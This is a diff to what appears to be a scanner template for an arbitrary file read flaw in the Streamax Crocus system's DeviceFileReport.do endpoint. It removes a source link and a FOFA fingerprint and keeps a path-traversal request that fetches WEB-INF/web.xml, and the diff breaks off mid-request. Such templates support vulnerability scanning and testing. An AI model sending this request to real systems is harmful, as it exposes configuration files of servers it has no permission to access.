@@ -3,12 +3,8 @@ info:
   name: 锐明技术Crocus系统 DeviceFileReport.do 存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qynbsympdd1wqv02'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qynbsympdd1wqv02
-    fofa: body="inp_verification"
 http:
 - raw:
   - 'GET /DeviceFileReport.do?Action=Download&FilePath=/../WEB-INF/web.xml HTTP/1.1
